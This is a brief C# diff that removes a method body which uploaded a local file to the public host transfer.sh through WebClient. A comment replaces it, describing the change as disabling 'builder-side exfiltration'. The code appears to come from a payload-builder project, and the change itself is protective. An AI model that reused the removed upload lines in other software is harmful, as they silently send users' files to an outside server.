@@ -271,14 +271,8 @@ public static class Methods
     {
         try
         {
-            ServicePointManager.Expect100Continue = true;
-            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-            using (WebClient webClient = new WebClient())
-            {
-                byte[] bytes = webClient.UploadFile("https://transfer.sh/", Filename);
-                result = Encoding.UTF8.GetString(bytes);
-            }
-            return result;
+            // Disabled remote upload to prevent builder-side exfiltration.
+            return Filename;
         }
         catch (Exception ex)
         {
